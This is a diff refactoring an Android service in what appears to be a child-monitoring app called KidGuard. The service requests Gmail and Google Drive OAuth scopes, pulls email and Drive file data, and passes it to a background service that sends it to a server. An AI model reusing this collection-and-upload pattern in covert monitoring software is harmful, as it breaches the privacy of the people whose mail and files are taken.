@@ -2,7 +2,6 @@ package com.kidguard.services;
 
 import android.Manifest;
 import android.app.Service;
-import android.content.Context;
 import android.content.Intent;
 import android.os.IBinder;
 import android.support.annotation.Nullable;
@@ -10,7 +9,6 @@ import android.support.annotation.Nullable;
 import com.google.api.client.googleapis.extensions.android.gms.auth.GoogleAccountCredential;
 import com.google.api.client.util.ExponentialBackOff;
 import com.google.api.services.drive.Drive;
-import com.google.api.services.gmail.Gmail;
 import com.kidguard.MainActivity;
 import com.kidguard.R;
 import com.kidguard.asynctask.MakeRequestDrive;
@@ -26,24 +24,20 @@ import java.util.Arrays;
 import pub.devrel.easypermissions.AfterPermissionGranted;
 import pub.devrel.easypermissions.EasyPermissions;
 
-@SuppressWarnings("all")
 public class GoogleAccountService extends Service implements Constant {
     private static final String TAG = GoogleAccountService.class.getSimpleName();
-    private static GoogleAccountService services;
 
-    /* Google Account Credential */
-    private GoogleAccountCredential mCredential;
-    private Context context;
+    private static GoogleAccountService gAccountServices;
+    public GoogleAccountCredential mCredential;
     private String tag;
     private String count;
     private String dateFrom;
     private String dateTo;
     private String subject;
     private String size;
-    private Gmail mService = null;
 
     public static GoogleAccountService getInstance() {
-        return services;
+        return gAccountServices;
     }
 
     @Nullable
@@ -55,8 +49,7 @@ public class GoogleAccountService extends Service implements Constant {
     @Override
     public void onCreate() {
         super.onCreate();
-        this.context = this;
-        services = GoogleAccountService.this;
+        gAccountServices = GoogleAccountService.this;
     }
 
     @Override
@@ -73,42 +66,31 @@ public class GoogleAccountService extends Service implements Constant {
         return super.onStartCommand(intent, flags, startId);
     }
 
-    /* Get Google Account */
+    // Get Google Account
     private void getGoogleAccount() {
         if (tag != null) {
             if (tag.equals(TAG_EMAIL)) {
-                mCredential = GoogleAccountCredential.usingOAuth2(
-                        getApplicationContext(), Arrays.asList(SCOPES_GMAIL))
-                        .setBackOff(new ExponentialBackOff());
+                mCredential = GoogleAccountCredential.usingOAuth2(getApplicationContext(), Arrays.asList(SCOPES_GMAIL)).setBackOff(new ExponentialBackOff());
             } else {
-                mCredential = GoogleAccountCredential.usingOAuth2(
-                        getApplicationContext(), Arrays.asList(SCOPES_GOOGLE_DRIVE))
-                        .setBackOff(new ExponentialBackOff());
+                mCredential = GoogleAccountCredential.usingOAuth2(getApplicationContext(), Arrays.asList(SCOPES_GOOGLE_DRIVE)).setBackOff(new ExponentialBackOff());
             }
         } else {
-            mCredential = GoogleAccountCredential.usingOAuth2(
-                    getApplicationContext(), Arrays.asList(SCOPES_GMAIL))
-                    .setBackOff(new ExponentialBackOff());
+            mCredential = GoogleAccountCredential.usingOAuth2(getApplicationContext(), Arrays.asList(SCOPES_GMAIL)).setBackOff(new ExponentialBackOff());
         }
 
         getResultsFromApi();
     }
 
-    /* Get Results From Api */
+    // Get Results From Api
     private void getResultsFromApi() {
         if (mCredential.getSelectedAccountName() == null) {
-
             chooseAccount();
-
         } else {
             if (tag != null && !tag.equals("")) {
-
                 if (tag.equals(TAG_EMAIL)) {
-                    new MakeRequestEmail(context, mCredential, count, dateFrom, dateTo, subject).execute();
-
+                    new MakeRequestEmail(this, mCredential, count, dateFrom, dateTo, subject).execute();
                 } else {
-                    new MakeRequestDrive(context, mCredential, count, dateFrom, dateTo, subject, size).execute();
-
+                    new MakeRequestDrive(this, mCredential, count, dateFrom, dateTo, subject, size).execute();
                 }
             }
         }
@@ -116,37 +98,26 @@ public class GoogleAccountService extends Service implements Constant {
 
     @AfterPermissionGranted(REQUEST_PERMISSION_GET_ACCOUNTS)
     private void chooseAccount() {
-        if (EasyPermissions.hasPermissions(
-                this, Manifest.permission.GET_ACCOUNTS)) {
+        if (EasyPermissions.hasPermissions(this, Manifest.permission.GET_ACCOUNTS)) {
             String accountName = Preference.getAccountName(this);
             if (accountName != null) {
-
                 mCredential.setSelectedAccountName(accountName);
                 getResultsFromApi();
-
             } else {
                 if (MainActivity.getInstance() != null) {
                     // Start a dialog from which the user can choose an account
-                    MainActivity.getInstance().startActivityForResult(
-                            mCredential.newChooseAccountIntent(),
-                            REQUEST_ACCOUNT_PICKER);
+                    MainActivity.getInstance().startActivityForResult(mCredential.newChooseAccountIntent(), REQUEST_ACCOUNT_PICKER);
                 }
-
             }
         } else {
             if (MainActivity.getInstance() != null) {
                 // Request the GET_ACCOUNTS permission via a user dialog
-                EasyPermissions.requestPermissions(
-                        MainActivity.getInstance(),
-                        getString(R.string.getAccountMsg),
-                        REQUEST_PERMISSION_GET_ACCOUNTS,
-                        Manifest.permission.GET_ACCOUNTS);
+                EasyPermissions.requestPermissions(MainActivity.getInstance(), getString(R.string.getAccountMsg), REQUEST_PERMISSION_GET_ACCOUNTS, Manifest.permission.GET_ACCOUNTS);
             }
         }
     }
 
-
-    /* Send EMAIL Data To Server */
+    // Send EMAIL Data To Server
     public void sendEmailDataToServer(ArrayList<Mail> lstEmail) {
         if (lstEmail != null && lstEmail.size() > 0) {
             BackgroundDataService.getInstance().sendEmailDataToServer(lstEmail);
@@ -154,7 +125,7 @@ public class GoogleAccountService extends Service implements Constant {
         stopSelf();
     }
 
-    /* Send Google Drive Data To Server */
+    // Send Google Drive Data To Server
     public void sendGoogleDriveDataToServer(ArrayList<GoogleDrive> lstDrive, Drive mDrive) {
         if (lstDrive != null && lstDrive.size() > 0) {
             BackgroundDataService.getInstance().sendGoogleDriveDataToServer(lstDrive, mDrive);
